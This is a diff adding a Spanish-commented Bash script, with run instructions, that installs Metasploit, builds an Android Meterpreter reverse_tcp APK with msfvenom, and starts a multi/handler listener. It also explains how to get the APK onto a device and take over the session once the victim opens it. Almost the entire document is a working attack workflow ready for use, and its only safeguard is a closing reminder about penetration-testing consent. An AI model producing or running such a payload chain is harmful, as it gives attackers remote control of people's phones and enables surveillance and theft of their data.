@@ -1,0 +1,74 @@
+#!/bin/bash
+
+# Script para crear un payload para Android utilizando Meterpreter y msfvenom
+
+# Paso 1: Preparación del Entorno
+# Asegúrate de tener Metasploit Framework instalado en tu sistema.
+# Este script asume que estás usando Kali Linux o un sistema compatible.
+
+# Actualiza los repositorios e instala Metasploit
+sudo apt update
+sudo apt install -y metasploit-framework
+
+# Paso 2: Generar el Payload
+# Ejecuta msfvenom para crear el payload de Android con Meterpreter.
+
+# Define tu IP y puerto
+LHOST=<tu_ip>  # Reemplaza <tu_ip> con tu dirección IP
+LPORT=<puerto>  # Reemplaza <puerto> con el puerto deseado (ej. 4444)
+
+# Genera el payload APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk
+
+# Verifica que el archivo payload.apk se haya creado
+ls -l payload.apk
+
+# Paso 3: Configurar el Listener en Metasploit
+# Inicia Metasploit para configurar el handler.
+
+# Abre Metasploit
+msfconsole <<EOF
+# Configura el exploit
+use exploit/multi/handler
+
+# Configura el payload
+set payload android/meterpreter/reverse_tcp
+
+# Configura las opciones LHOST y LPORT
+set LHOST $LHOST
+set LPORT $LPORT
+
+# Inicia el listener
+exploit
+EOF
+
+# Paso 4: Instalar el Payload en el Dispositivo Android
+# Transfiere el archivo payload.apk al dispositivo Android utilizando ADB, correo, etc.
+# Asegúrate de que el dispositivo tenga habilitadas las instalaciones de fuentes desconocidas.
+
+# Aquí puedes agregar el comando ADB si tienes el dispositivo conectado:
+# adb install payload.apk
+
+# Paso 5: Captura la Sesión Meterpreter
+# Una vez que el usuario abra el APK en el dispositivo Android, deberías ver una sesión Meterpreter abierta.
+
+# Interactúa con la sesión utilizando el ID de sesión que se muestra en Metasploit.
+# Por ejemplo, si el ID de la sesión es 1:
+# sessions -i 1
+
+# Fin del Script
+```
+
+### Instrucciones para Ejecutar el Script
+
+1. **Copia el script** en un archivo de texto y guárdalo como `create_payload.sh`.
+2. **Asegúrate de que el script tenga permisos de ejecución**:
+   ```bash
+   chmod +x create_payload.sh
+   ```
+3. **Ejecuta el script**:
+   ```bash
+   ./create_payload.sh
+   ```
+
+Recuerda reemplazar `<tu_ip>` y `<puerto>` con los valores adecuados antes de ejecutar el script. Además, asegúrate de tener el consentimiento adecuado para realizar pruebas de penetración.
